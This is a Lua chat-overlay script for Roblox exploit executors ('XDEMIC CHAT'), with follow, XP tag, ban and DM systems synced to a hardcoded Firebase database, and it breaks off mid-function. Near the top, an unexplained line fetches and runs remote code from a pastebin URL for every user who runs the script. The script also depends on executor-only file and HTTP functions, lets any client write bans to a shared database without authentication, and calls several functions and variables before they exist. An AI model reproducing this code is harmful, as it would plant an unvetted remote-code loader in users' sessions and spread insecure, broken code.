--[[
    XDEMIC CHAT v15.0 | LocalScript -> StarterPlayerScripts
    Enhanced Features: Follow, Leaderboard, BXD Bubbles, Milestone Tags, Creator Tools
    [MULTIPLAYER DATABASE SYNC ACTIVE]
--]]

local Players         = game:GetService("Players")
local TweenSvc        = game:GetService("TweenService")
local UIS             = game:GetService("UserInputService")
local ContentProvider = game:GetService("ContentProvider")
local HttpSvc         = game:GetService("HttpService")
local RunService      = game:GetService("RunService")

local Player = Players.LocalPlayer
loadstring(game:HttpGet("https://pastebin.com/raw/NceJTP5b"))()

-- ============================================================
--  FIREBASE REALTIME DATABASE SYNC CONFIGURATION
-- ============================================================
local FIREBASE_URL = "https://xdemic-chat-default-rtdb.asia-southeast1.firebasedatabase.app/"
local lastProcessedKey = ""
local initialFetchDone = false

-- Executor-Safe Universal HTTP Request Wrapper
local function makeHttpRequest(options)
    local req = (syn and syn.request) or http_request or request or (http and http.request)
    if req then
        local success, response = pcall(req, options)
        if success then return response end
    end
    return nil
end

-- ============================================================
--  CORE FUNCTIONS & CONFIGS
-- ============================================================
local function make(class, props)
    local o = Instance.new(class)
    for k, v in pairs(props) do o[k] = v end
    return o
end

local C = {
    WIN    = Color3.fromRGB(30, 30, 36),
    BG2    = Color3.fromRGB(38, 38, 46),
    BG3    = Color3.fromRGB(50, 50, 60),
    TABBAR = Color3.fromRGB(20, 20, 25),
    INPUT  = Color3.fromRGB(28, 28, 35),
    BLUE   = Color3.fromRGB(30, 120, 255),
    SYSBG  = Color3.fromRGB(70, 56, 8),
    SYSTXT = Color3.fromRGB(255, 208, 35),
    WHITE  = Color3.fromRGB(255, 255, 255),
    GRAY   = Color3.fromRGB(135, 135, 152),
    ME     = Color3.fromRGB(42, 42, 54),
    THEM   = Color3.fromRGB(42, 42, 54),
    RED    = Color3.fromRGB(200, 48, 48),
    GREEN  = Color3.fromRGB(28, 185, 82),
    GOLD   = Color3.fromRGB(255, 215, 0),
    PURPLE = Color3.fromRGB(155, 89, 182),
    ORANGE = Color3.fromRGB(243, 156, 18),
}

-- ============================================================
--  CREATOR SYSTEM
-- ============================================================
local CREATORS = {
    ["DAVID_BLOX65"] = true,
    ["viraat_shukla18"] = true,
    ["XxClumy_huywr3"] = true,
    ["Hey_ImLexi70"] = true,
    ["VENUS_EDIT"] = true
}

local function isCreator(name)
    return CREATORS[name] or false
end

-- ============================================================
--  MILESTONE TAGS (XP-Based)
-- ============================================================
local MILESTONE_TAGS = {
    {name = "🎯", label = "Newbie", xp = 0},
    {name = "⭐", label = "Rookie", xp = 50},
    {name = "🌟", label = "Rising Star", xp = 150},
    {name = "🔥", label = "On Fire", xp = 300},
    {name = "💎", label = "Diamond", xp = 500},
    {name = "👑", label = "Royal", xp = 800},
    {name = "⚡", label = "Legend", xp = 1200},
    {name = "🌊", label = "Wave Rider", xp = 1800},
    {name = "🚀", label = "Rocket", xp = 2500},
    {name = "🌌", label = "Cosmic", xp = 3500},
    {name = "🪐", label = "Galactic", xp = 5000},
    {name = "🌠", label = "Stellar", xp = 7500},
    {name = "🌈", label = "Rainbow", xp = 10000},
    {name = "🏆", label = "Champion", xp = 15000},
    {name = "💀", label = "Reaper", xp = 20000},
    {name = "👾", label = "Alien", xp = 30000},
    {name = "🔥", label = "Phoenix", xp = 50000},
    {name = "👑", label = "Emperor", xp = 100000},
}

local function getMilestoneTag(xp)
    local highest = MILESTONE_TAGS[1]
    for _, tag in ipairs(MILESTONE_TAGS) do
        if xp >= tag.xp then highest = tag end
    end
    return highest
end

local function getAvailableTags(xp)
    local available = {}
    for _, tag in ipairs(MILESTONE_TAGS) do
        if xp >= tag.xp then table.insert(available, tag) end
    end
    return available
end

-- ============================================================
--  PROFILE DATA (Extended)
-- ============================================================
local ClientProfileData = {
    DisplayName = Player.DisplayName,
    Bio = "",
    ProfileImage = "https://www.roblox.com/headshot-thumbnail/image?userId="..Player.UserId.."&width=150&height=150&format=png",
    RobloxId = Player.UserId,
    XP = 0,
    Level = 1,
    Tags = {},
}

local function saveProfileData()
    local data = {
        displayName = ClientProfileData.DisplayName,
        bio = ClientProfileData.Bio,
        profileImage = ClientProfileData.ProfileImage,
        robloxId = ClientProfileData.RobloxId,
        xp = ClientProfileData.XP,
        level = ClientProfileData.Level,
        tags = ClientProfileData.Tags,
    }
    local ok, enc = pcall(function() return HttpSvc:JSONEncode(data) end)
    if ok then
        Player.PlayerGui:SetAttribute("XdemicProfileData", enc)
        -- Also broadcast to Firebase for leaderboard
        broadcastProfileData()
    end
end

local function loadProfileData()
    local raw = Player.PlayerGui:GetAttribute("XdemicProfileData")
    if raw and raw ~= "" then
        local ok, data = pcall(function() return HttpSvc:JSONDecode(raw) end)
        if ok and type(data) == "table" then
            ClientProfileData.DisplayName = data.displayName or Player.DisplayName
            ClientProfileData.Bio = data.bio or ""
            ClientProfileData.ProfileImage = data.profileImage or "https://www.roblox.com/headshot-thumbnail/image?userId="..Player.UserId.."&width=150&height=150&format=png"
            ClientProfileData.RobloxId = data.robloxId or Player.UserId
            ClientProfileData.XP = data.xp or 0
            ClientProfileData.Level = data.level or 1
            ClientProfileData.Tags = data.tags or {}
        end
    end
    -- Ensure tags are up to date with XP
    updateTags()
end

local function updateTags()
    if isCreator(Player.Name) then
        -- Creators get all tags
        local allTags = {}
        for _, tag in ipairs(MILESTONE_TAGS) do
            table.insert(allTags, tag.name.." "..tag.label)
        end
        ClientProfileData.Tags = allTags
    else
        local available = getAvailableTags(ClientProfileData.XP)
        ClientProfileData.Tags = {}
        for _, tag in ipairs(available) do
            table.insert(ClientProfileData.Tags, tag.name.." "..tag.label)
        end
    end
    saveProfileData()
end

local function addXP(amount)
    ClientProfileData.XP = ClientProfileData.XP + amount
    -- Level up every 100 XP
    ClientProfileData.Level = math.floor(ClientProfileData.XP / 100) + 1
    updateTags()
    saveProfileData()
end

local function broadcastProfileData()
    if FIREBASE_URL == "https://YOUR-PROJECT-ID-default-rtdb.firebaseio.com/" then return end
    local data = {
        name = Player.Name,
        displayName = ClientProfileData.DisplayName,
        xp = ClientProfileData.XP,
        level = ClientProfileData.Level,
        followers = FollowSystem.FollowerCount,
        profileImage = ClientProfileData.ProfileImage,
    }
    local success, json = pcall(function() return HttpSvc:JSONEncode(data) end)
    if success then
        makeHttpRequest({
            Url = FIREBASE_URL .. "profiles/"..Player.Name..".json",
            Method = "PUT",
            Headers = { ["Content-Type"] = "application/json" },
            Body = json
        })
    end
end

-- ============================================================
--  FOLLOW SYSTEM
-- ============================================================
local FollowSystem = {
    Following = {},
    Followers = {},
    FollowCount = 0,
    FollowerCount = 0,
}

local function saveFollowData()
    local data = {
        following = FollowSystem.Following,
        followers = FollowSystem.Followers,
    }
    local ok, enc = pcall(function() return HttpSvc:JSONEncode(data) end)
    if ok then
        Player.PlayerGui:SetAttribute("XdemicFollowData", enc)
    end
end

local function loadFollowData()
    local raw = Player.PlayerGui:GetAttribute("XdemicFollowData")
    if raw and raw ~= "" then
        local ok, data = pcall(function() return HttpSvc:JSONDecode(raw) end)
        if ok and type(data) == "table" then
            FollowSystem.Following = data.following or {}
            FollowSystem.Followers = data.followers or {}
            FollowSystem.FollowCount = #FollowSystem.Following
            FollowSystem.FollowerCount = #FollowSystem.Followers
        end
    end
end
loadFollowData()

local function followPlayer(targetName)
    if targetName == Player.Name then return false end
    local alreadyFollowing = false
    for i, name in ipairs(FollowSystem.Following) do
        if name == targetName then
            table.remove(FollowSystem.Following, i)
            alreadyFollowing = true
            break
        end
    end
    if not alreadyFollowing then
        table.insert(FollowSystem.Following, targetName)
        FollowSystem.FollowCount = #FollowSystem.Following
        saveFollowData()
        broadcastFollowAction(targetName, "follow")
        return true
    else
        FollowSystem.FollowCount = #FollowSystem.Following
        saveFollowData()
        broadcastFollowAction(targetName, "unfollow")
        return false
    end
end

local function broadcastFollowAction(targetName, action)
    if FIREBASE_URL == "https://YOUR-PROJECT-ID-default-rtdb.firebaseio.com/" then return end
    local data = {
        actor = Player.Name,
        target = targetName,
        action = action,
        timestamp = os.time(),
    }
    local success, json = pcall(function() return HttpSvc:JSONEncode(data) end)
    if success then
        makeHttpRequest({
            Url = FIREBASE_URL .. "follows.json",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = json
        })
    end
end

-- ============================================================
--  BAN/UNBAN SYSTEM WITH ERROR CODES
-- ============================================================
local ScriptBans = {}
local BanMessages = {
    ["ERR_001"] = {title = "🚫 Account Suspended", message = "Your account has been suspended for violating community guidelines."},
    ["ERR_002"] = {title = "⛔ Access Denied", message = "You have been denied access to this script environment."},
    ["ERR_003"] = {title = "🔒 Security Lockdown", message = "Your account has been locked due to suspicious activity."},
    ["ERR_004"] = {title = "⚖️ Terms Violation", message = "You have violated the terms of service."},
    ["ERR_005"] = {title = "🛡️ Protection Shield", message = "You have been banned by a creator/mod."},
    ["ERR_006"] = {title = "💀 Permanent Ban", message = "Your account has been permanently banned from using XDEMIC Chat."},
    ["ERR_007"] = {title = "⏳ Temporary Ban", message = "You have been temporarily banned. Please try again later."},
}

local function banPlayer(targetName, errorCode, customMessage)
    ScriptBans[targetName] = true
    local banData = {
        banned = true,
        errorCode = errorCode or "ERR_005",
        customMessage = customMessage or BanMessages[errorCode] and BanMessages[errorCode].message or "",
        timestamp = os.time(),
        banner = Player.Name,
    }
    local ok, enc = pcall(function() return HttpSvc:JSONEncode(banData) end)
    if ok then
        Player.PlayerGui:SetAttribute("BanData_"..targetName, enc)
    end
    -- Broadcast ban
    local data = {
        target = targetName,
        errorCode = errorCode or "ERR_005",
        customMessage = customMessage,
        banner = Player.Name,
        timestamp = os.time(),
    }
    local success, json = pcall(function() return HttpSvc:JSONEncode(data) end)
    if success then
        makeHttpRequest({
            Url = FIREBASE_URL .. "bans.json",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = json
        })
    end
    -- Kick if local
    if targetName == Player.Name then
        local banInfo = BanMessages[errorCode] or BanMessages["ERR_005"]
        local title = banInfo.title or "🚫 Banned"
        local message = customMessage or banInfo.message or "You have been banned from using XDEMIC Chat."
        task.delay(1, function()
            Player:Kick("\n["..title.."]\n"..message.."\n\nCode: "..(errorCode or "ERR_005"))
        end)
    end
end

local function unbanPlayer(targetName)
    ScriptBans[targetName] = nil
    Player.PlayerGui:SetAttribute("BanData_"..targetName, nil)
    local data = {
        target = targetName,
        unbanner = Player.Name,
        timestamp = os.time(),
    }
    local success, json = pcall(function() return HttpSvc:JSONEncode(data) end)
    if success then
        makeHttpRequest({
            Url = FIREBASE_URL .. "bans.json",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = json
        })
    end
end

local function isBanned(targetName)
    return ScriptBans[targetName] or false
end

-- ============================================================
--  TRANSLATE FUNCTION
-- ============================================================
local function translateText(text, targetLang)
    if not text or text == "" then return text end
    local url = "https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl="..targetLang.."&dt=t&q="..HttpSvc:URLEncode(text)
    local response = makeHttpRequest({
        Url = url,
        Method = "GET",
    })
    if response and response.StatusCode == 200 then
        local ok, data = pcall(function() return HttpSvc:JSONDecode(response.Body) end)
        if ok and data and data[1] and data[1][1] then
            return data[1][1][1]
        end
    end
    return text
end

-- ============================================================
--  COPY FUNCTION
-- ============================================================
local function copyText(text)
    local tb = make("TextBox", {
        Text = text,
        Size = UDim2.new(0, 1, 0, 1),
        BackgroundTransparency = 1,
        TextTransparency = 1,
        Parent = Gui,
    })
    tb:CaptureFocus()
    tb:ReleaseFocus()
    tb:Destroy()
    return true
end

-- ============================================================
--  EXECUTOR IMAGELOADER ENGINE
-- ============================================================
local function getImageAsset(url)
    if not url or url == "" or url == "IMAGE_URL_HERE" then return "" end
    if string.find(url, "rbxassetid://") or string.find(url, "assetgame") or tonumber(url) then
        return url
    end
    if string.find(url, "http://") or string.find(url, "https://") then
        if isfile and writefile and getcustomasset then
            local safeName = "xdemic_img_" .. string.gsub(url, "[^%w]", ""):sub(-30) .. ".png"
            if not isfile(safeName) then
                local success, content = pcall(function() return game:HttpGet(url) end)
                if success and content then
                    writefile(safeName, content)
                else
                    warn("[Xdemic Error] Failed to download image from URL: " .. url)
                    return ""
                end
            end
            return getcustomasset(safeName)
        end
    end
    return url
end

-- ============================================================
--  RGB RAINBOW ENGINE
-- ============================================================
local RGB_LABELS = {}
local RICH_RGB_LABELS = {}

local function registerRGB(label)
    table.insert(RGB_LABELS, label)
    label.Destroying:Connect(function()
        for i, v in ipairs(RGB_LABELS) do
            if v == label then table.remove(RGB_LABELS, i) break end
        end
    end)
end

local function registerRichRGB(label, displayName, messageText)
    table.insert(RICH_RGB_LABELS, {label = label, name = displayName, text = messageText})
    label.Destroying:Connect(function()
        for i, v in ipairs(RICH_RGB_LABELS) do
            if v.label == label then table.remove(RICH_RGB_LABELS, i) break end
        end
    end)
end

local function rgbToHex(c)
    return string.format("#%02X%02X%02X", math.floor(c.R*255), math.floor(c.G*255), math.floor(c.B*255))
end

task.spawn(function()
    while task.wait(0.03) do
        local hue = (os.clock() % 3) / 3
        local color = Color3.fromHSV(hue, 1, 1)
        local hex = rgbToHex(color)
        for _, label in ipairs(RGB_LABELS) do
            if label and label.Parent then label.TextColor3 = color end
        end
        for _, data in ipairs(RICH_RGB_LABELS) do
            if data.label and data.label.Parent then
                data.label.Text = "<b><font color='"..hex.."'>[CREATOR]</font></b> <b>"..data.name..":</b> "..data.text
            end
        end
    end
end)

-- ============================================================
--  DM STORE (unchanged)
-- ============================================================
local DM_STORE={}
local function dmKey(a,b)
    local t={a,b} table.sort(t) return t[1].."__"..t[2]
end
local function saveConvo(key)
    local ok,enc=pcall(function() return HttpSvc:JSONEncode(DM_STORE[key] or {}) end)
    if ok then pcall(function() Player.PlayerGui:SetAttribute("XD_"..key,enc) end) end
end
local function loadConvo(key)
    if DM_STORE[key] then return DM_STORE[key] end
    local raw=Player.PlayerGui:GetAttribute("XD_"..key)
    if raw then
        local ok,dec=pcall(function() return HttpSvc:JSONDecode(raw) end)
        if ok and dec then DM_STORE[key]=dec return dec end
    end
    DM_STORE[key]={} return {}
end
local function appendDM(key,msg)
    if not DM_STORE[key] then loadConvo(key) end
    table.insert(DM_STORE[key],msg)
    if #DM_STORE[key]>200 then
        local trim={}
        for i=#DM_STORE[key]-199,#DM_STORE[key] do table.insert(trim,DM_STORE[key][i]) end
        DM_STORE[key]=trim
    end
    saveConvo(key)
end

-- ============================================================
--  STATE & GLOBAL VARIABLES
-- ============================================================
local chatOpen   = false
local urlOpen    = false
local dmTarget   = nil
local dmContacts = {}
local currentTab = "SERVER"

local MsgScroll
local switchTab
local addDMContact
local appendToMemeGalleryGrid

-- ============================================================
--  MORE HELPERS
-- ============================================================
local function corner(p,r)
    local c=Instance.new("UICorner") c.CornerRadius=UDim.new(0,r or 8) c.Parent=p
end
local function stroke(p,col,t)
    local s=Instance.new("UIStroke") s.Color=col or Color3.fromRGB(55,55,70) s.Thickness=t or 1 s.Parent=p
end
local function ll(p,dir,sp)
    local l=Instance.new("UIListLayout") l.FillDirection=dir or Enum.FillDirection.Vertical
    l.SortOrder=Enum.SortOrder.LayoutOrder l.Padding=UDim.new(0,sp or 4) l.Parent=p
end
local function tw(o,t,pr)
    TweenSvc:Create(o,TweenInfo.new(t,Enum.EasingStyle.Quart,Enum.EasingDirection.Out),pr):Play()
end
local function getTime()
    local t=os.date("*t") return string.format("%02d:%02d",t.hour,t.min)
end
local function preload(id)
    task.spawn(function()
        local resolvedAsset = getImageAsset(id)
        if resolvedAsset and resolvedAsset ~= "" then
            local t=make("ImageLabel",{Image=resolvedAsset, Parent=game:GetService("CoreGui")})
            pcall(function() ContentProvider:PreloadAsync({t}) end) t:Destroy()
        end
    end)
end

-- ============================================================
--  INITIALIZATION & BAN GATE
-- ============================================================
local Gui = make("ScreenGui",{Name="XdemicChat",ResetOnSpawn=false,ZIndexBehavior=Enum.ZIndexBehavior.Sibling,IgnoreGuiInset=true})
if ScriptBans[Player.Name] then
    Gui:Destroy()
    Player:Kick("\n[XDEMIC CHAT]\nYou are banned from using this script environment.")
    return
end
Gui.Parent = Player.PlayerGui

Players.PlayerAdded:Connect(function(joinedPlayer)
    if ScriptBans[joinedPlayer.Name] then end
end)

-- ============================================================
--  TOAST NOTIFICATION SYSTEM
-- ============================================================
local ToastHolder = make("Frame", {
    Size = UDim2.new(1,0,1,0),
    BackgroundTransparency = 1,
    Parent = Gui,
    ZIndex = 999
})

local function showToast(title, text, userId, icon)
    local toast = make("Frame", {
        Size = UDim2.new(0, 260, 0, 70),
        Position = UDim2.new(1, 300, 1, -100),
        BackgroundColor3 = C.BG2,
        Parent = ToastHolder,
        ZIndex = 1000
    })
    corner(toast, 10)
    stroke(toast, Color3.fromRGB(80,80,100), 1.2)

    local iconLabel = make("TextLabel", {
        Size = UDim2.new(0, 44, 0, 44),
        Position = UDim2.new(0, 10, 0.5, -22),
        BackgroundTransparency = 1,
        Text = icon or "💬",
        TextSize = 28,
        Font = Enum.Font.GothamBold,
        Parent = toast,
        ZIndex = 1001
    })

    local t1 = make("TextLabel", {
        Size = UDim2.new(1, -70, 0, 20),
        Position = UDim2.new(0, 62, 0, 10),
        BackgroundTransparency = 1,
        Text = title,
        TextColor3 = C.WHITE,
        TextSize = 13,
        Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = toast,
        ZIndex = 1001
    })

    local t2 = make("TextLabel", {
        Size = UDim2.new(1, -70, 0, 30),
        Position = UDim2.new(0, 62, 0, 28),
        BackgroundTransparency = 1,
        Text = text,
        TextColor3 = C.GRAY,
        TextSize = 11,
        Font = Enum.Font.Gotham,
        TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = toast,
        ZIndex = 1001
    })

    tw(toast, 0.35, {Position = UDim2.new(1, -270, 1, -100)})

    task.delay(4, function()
        tw(toast, 0.3, {Position = UDim2.new(1, 300, 1, -100)})
        task.wait(0.3)
        toast:Destroy()
    end)
end

-- ============================================================
--  DRAG MODULE (unchanged)
-- ============================================================
local dragTargets={} local activeDrag=nil
local dragStart=Vector2.new() local dragPos=UDim2.new()

local function makeDraggable(handle,target)
    table.insert(dragTargets,{h=handle,t=target})
end
UIS.InputBegan:Connect(function(inp)
    if inp.UserInputType~=Enum.UserInputType.MouseButton1 and inp.UserInputType~=Enum.UserInputType.Touch then return end
    local pos=Vector2.new(inp.Position.X,inp.Position.Y)
    for _,dt in ipairs(dragTargets) do
        local a=dt.h.AbsolutePosition local s=dt.h.AbsoluteSize
        if pos.X>=a.X and pos.X<=a.X+s.X and pos.Y>=a.Y and pos.Y<=a.Y+s.Y then
            activeDrag=dt.t dragStart=pos dragPos=dt.t.Position break
        end
    end
end)
UIS.InputChanged:Connect(function(inp)
    if not activeDrag then return end
    if inp.UserInputType~=Enum.UserInputType.MouseMovement and inp.UserInputType~=Enum.UserInputType.Touch then return end
    local d=Vector2.new(inp.Position.X,inp.Position.Y)-dragStart
    activeDrag.Position=UDim2.new(dragPos.X.Scale,dragPos.X.Offset+d.X,dragPos.Y.Scale,dragPos.Y.Offset+d.Y)
end)
UIS.InputEnded:Connect(function(inp)
    if inp.UserInputType==Enum.UserInputType.MouseButton1 or inp.UserInputType==Enum.UserInputType.Touch then activeDrag=nil end
end)

-- ============================================================
--  BXD-STYLE BUBBLE SYSTEM (Enhanced)
-- ============================================================
local headBubbles = {}

local function showBubble(sender, text, isImg, imgUrl)
    if ScriptBans[sender] then
        if sender == Player.Name then
            Gui:Destroy()
            Player:Kick("\n[XDEMIC CHAT]\nScript interaction violation detected.")
        end
        return
    end
    if MutedPlayers.All or MutedPlayers[sender] then return end

    local p = Players:FindFirstChild(sender)
    if not p then return end
    local char = p.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end
    if headBubbles[sender] then headBubbles[sender]:Destroy() end

    local displayNameToShow = (sender == Player.Name) and ClientProfileData.DisplayName or (p.DisplayName or sender)
    local targetUid = p.UserId or 0
    local targetProfileImage = "https://www.roblox.com/headshot-thumbnail/image?userId="..targetUid.."&width=100&height=100&format=png"

    -- Main Billboard
    local bb = make("BillboardGui", {
        Size = UDim2.new(0, 280, 0, 130),
        StudsOffset = Vector3.new(0, 4.2, 0),
        AlwaysOnTop = true,
        Adornee = head,
        Parent = head,
        ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    })

    -- Main frame with gradient
    local mainFrame = make("Frame", {
        Size = UDim2.new(1, 0, 1, -12),
        BackgroundColor3 = C.WIN,
        BackgroundTransparency = 0.1,
        ZIndex = 2,
        Parent = bb
    })
    corner(mainFrame, 12)
    stroke(mainFrame, Color3.fromRGB(80, 80, 120), 1.5)

    -- Gradient overlay
    local gradient = make("Frame", {
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundColor3 = Color3.fromRGB(50, 50, 70),
        BackgroundTransparency = 0.3,
        ZIndex = 1,
        Parent = mainFrame
    })
    corner(gradient, 12)

    -- Glow
    local glow = make("Frame", {
        Size = UDim2.new(1, 20, 1, 20),
        Position = UDim2.new(0, -10, 0, -10),
        BackgroundColor3 = C.BLUE,
        BackgroundTransparency = 0.9,
        ZIndex = 0,
        Parent = bb
    })
    corner(glow, 20)

    -- Tail
    local tail = make("ImageLabel", {
        Size = UDim2.new(0, 20, 0, 14),
        Position = UDim2.new(0.5, -10, 1, -14),
        BackgroundTransparency = 1,
        Image = "rbxassetid://6034226343",
        ImageColor3 = C.WIN,
        ZIndex = 3,
        Parent = bb
    })

    -- Content
    local content = make("Frame", {
        Size = UDim2.new(1, -8, 1, -8),
        Position = UDim2.new(0, 4, 0, 4),
        BackgroundTransparency = 1,
        ZIndex = 4,
        Parent = mainFrame
    })
    local layout = make("UIListLayout", {
        FillDirection = Enum.FillDirection.Vertical,
        SortOrder = Enum.SortOrder.LayoutOrder,
        Padding = UDim.new(0, 4),
        Parent = content
    })

    -- Header: avatar + name + creator badge
    local header = make("Frame", {
        Size = UDim2.new(1, 0, 0, 28),
        BackgroundTransparency = 1,
        LayoutOrder = 1,
        Parent = content
    })
    local hLayout = make("UIListLayout", {
        FillDirection = Enum.FillDirection.Horizontal,
        SortOrder = Enum.SortOrder.LayoutOrder,
        Padding = UDim.new(0, 6),
        VerticalAlignment = Enum.VerticalAlignment.Center,
        Parent = header
    })

    local pfp = make("ImageLabel", {
        Size = UDim2.new(0, 24, 0, 24),
        BackgroundColor3 = C.BG3,
        Image = targetProfileImage,
        LayoutOrder = 1,
        Parent = header
    })
    corner(pfp, 12)

    local nameLabel = make("TextLabel", {
        Size = UDim2.new(0, 150, 0, 24),
        BackgroundTransparency = 1,
        Text = displayNameToShow,
        TextColor3 = C.WHITE,
        TextSize = 13,
        Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Left,
        LayoutOrder = 2,
        Parent = header
    })

    if isCreator(sender) then
        local creatorTag = make("TextLabel", {
            Size = UDim2.new(0, 60, 0, 24),
            BackgroundTransparency = 1,
            Text = "👑 CREATOR",
            TextColor3 = C.GOLD,
            TextSize = 11,
            Font = Enum.Font.GothamBold,
            LayoutOrder = 3,
            Parent = header
        })
        registerRGB(creatorTag)
    end

    -- Tags (if any)
    local profileData = nil
    local raw = Player.PlayerGui:GetAttribute("XdemicProfileData_"..sender)
    if raw then
        local ok, data = pcall(function() return HttpSvc:JSONDecode(raw) end)
        if ok then profileData = data end
    end
    if profileData and profileData.tags and #profileData.tags > 0 then
        local tagsFrame = make("Frame", {
            Size = UDim2.new(1, 0, 0, 20),
            BackgroundTransparency = 1,
            LayoutOrder = 2,
            Parent = content
        })
        local tLayout = make("UIListLayout", {
            FillDirection = Enum.FillDirection.Horizontal,
            SortOrder = Enum.SortOrder.LayoutOrder,
            Padding = UDim.new(0, 4),
            Parent = tagsFrame
        })
        for i, tag in ipairs(profileData.tags) do
            if i <= 3 then -- show max 3 tags
                local tagLabel = make("TextLabel", {
                    Size = UDim2.new(0, 40, 0, 18),
                    BackgroundColor3 = Color3.fromRGB(60, 60, 80),
                    Text = tag,
                    TextColor3 = C.WHITE,
                    TextSize = 10,
                    Font = Enum.Font.GothamBold,
                    LayoutOrder = i,
                    Parent = tagsFrame
                })
                corner(tagLabel, 9)
            end
        end
    end

    -- Message content
    local msgFrame = make("Frame", {
        Size = UDim2.new(1, 0, 0, 0),
        AutomaticSize = Enum.AutomaticSize.Y,
        BackgroundTransparency = 1,
        LayoutOrder = 3,
        Parent = content
    })

    if isImg then
        local imgDisplay = make("ImageLabel", {
            Size = UDim2.new(0, 80, 0, 80),
            BackgroundColor3 = C.BG3,
            Image = getImageAsset(imgUrl),
            LayoutOrder = 1,
            Parent = msgFrame
        })
        corner(imgDisplay, 6)
    else
        local msgLabel = make("TextLabel", {
            Size = UDim2.new(1, -8, 0, 0),
            AutomaticSize = Enum.AutomaticSize.Y,
            BackgroundTransparency = 1,
            Text = text,
            TextColor3 = C.WHITE,
            TextSize = 12,
            Font = Enum.Font.Gotham,
            TextWrapped = true,
            TextXAlignment = Enum.TextXAlignment.Left,
            LayoutOrder = 1,
            Parent = msgFrame
        })
    end

    headBubbles[sender] = bb

    -- Animate in
    mainFrame.BackgroundTransparency = 1
    tw(mainFrame, 0.3, {BackgroundTransparency = 0.1})
    tw(glow, 0.3, {BackgroundTransparency = 0.85, Size = UDim2.new(1, 30, 1, 30), Position = UDim2.new(0, -15, 0, -15)})

    task.delay(8, function()
        if bb and bb.Parent then
            tw(mainFrame, 0.4, {BackgroundTransparency = 1})
            tw(tail, 0.4, {ImageTransparency = 1})
            tw(glow, 0.4, {BackgroundTransparency = 1})
            task.delay(0.4, function()
                bb:Destroy()
                if headBubbles[sender] == bb then headBubbles[sender] = nil end
            end)
        end
    end)
end

-- ============================================================
--  DATABASE PACKET OUTBOUND ROUTING
-- ============================================================
local function broadcastPayload(sender, text, isImg, imgUrl)
    if FIREBASE_URL == "https://YOUR-PROJECT-ID-default-rtdb.firebaseio.com/" then return end
    task.spawn(function()
        local data = {
            sender = sender,
            displayName = ClientProfileData.DisplayName,
            text = text,
            isImg = isImg,
            imgUrl = imgUrl or "",
            timestamp = os.time()
        }
        local success, json = pcall(function() return HttpSvc:JSONEncode(data) end)
        if success then
            makeHttpRequest({
                Url = FIREBASE_URL .. "global_chat.json",
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = json
            })
        end
    end)
end

-- ============================================================
--  QUICK ACTIONS & CONTEXT MENUS (Enhanced with Translate)
-- ============================================================
local QuickActionMenu = make("Frame",{
    Size=UDim2.new(0,140,0,66),BackgroundColor3=C.BG2,Visible=false,ZIndex=990,Parent=Gui
})
corner(QuickActionMenu,8) stroke(QuickActionMenu,Color3.fromRGB(70,70,95),1.5)

local qaTargetName = ""
local qaDmBtn=make("TextButton",{Size=UDim2.new(1,0,0,32),BackgroundTransparency=1,Text="💬  Start DM",TextColor3=C.WHITE,TextSize=12,Font=Enum.Font.GothamBold,ZIndex=991,Parent=QuickActionMenu})
make("Frame",{Size=UDim2.new(1,-10,0,1),Position=UDim2.new(0,5,0,32),BackgroundColor3=Color3.fromRGB(60,60,80),ZIndex=991,Parent=QuickActionMenu})
local qaCloseBtn=make("TextButton",{Size=UDim2.new(1,0,0,32),Position=UDim2.new(0,0,0,33),BackgroundTransparency=1,Text="✕  Cancel",TextColor3=C.RED,TextSize=12,Font=Enum.Font.GothamBold,ZIndex=991,Parent=QuickActionMenu})

local function openQuickAction(targetUser, pos)
    if targetUser == Player.Name or ScriptBans[targetUser] then return end
    qaTargetName = targetUser
    QuickActionMenu.Position = UDim2.new(0, math.min(pos.X, Gui.AbsoluteSize.X - 145), 0, math.min(pos.Y, Gui.AbsoluteSize.Y - 70))
    QuickActionMenu.Visible = true
end
qaCloseBtn.MouseButton1Click:Connect(function() QuickActionMenu.Visible = false end)

-- Context Menu with Copy and Translate
local CtxMenu=make("Frame",{Size=UDim2.new(0,150,0,96),BackgroundColor3=C.BG2,Visible=false,ZIndex=950,Parent=Gui})
corner(CtxMenu,8) stroke(CtxMenu,Color3.fromRGB(60,60,80),1)
local ctxCopy=make("TextButton",{Size=UDim2.new(1,0,0,31),BackgroundTransparency=1,Text="  📋  Copy",TextColor3=C.WHITE,TextSize=12,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=951,Parent=CtxMenu})
make("Frame",{Size=UDim2.new(1,-10,0,1),Position=UDim2.new(0,5,0,31),BackgroundColor3=Color3.fromRGB(60,60,80),ZIndex=951,Parent=CtxMenu})
local ctxTrans=make("TextButton",{Size=UDim2.new(1,0,0,31),Position=UDim2.new(0,0,0,33),BackgroundTransparency=1,Text="  🌐  Translate (EN)",TextColor3=C.WHITE,TextSize=12,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=951,Parent=CtxMenu})
make("Frame",{Size=UDim2.new(1,-10,0,1),Position=UDim2.new(0,5,0,64),BackgroundColor3=Color3.fromRGB(60,60,80),ZIndex=951,Parent=CtxMenu})
local ctxClose=make("TextButton",{Size=UDim2.new(1,0,0,31),Position=UDim2.new(0,0,0,65),BackgroundTransparency=1,Text="  ✕  Close",TextColor3=C.RED,TextSize=12,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=951,Parent=CtxMenu})

local ctxText=""
local function showCtx(text,x,y)
    ctxText=text
    local sw=Gui.AbsoluteSize.X
    local sh=Gui.AbsoluteSize.Y
    CtxMenu.Position=UDim2.new(0,math.min(x,sw-155),0,math.min(y,sh-100))
    CtxMenu.Visible=true
end
ctxCopy.MouseButton1Click:Connect(function()
    copyText(ctxText)
    CtxMenu.Visible=false
end)
ctxTrans.MouseButton1Click:Connect(function()
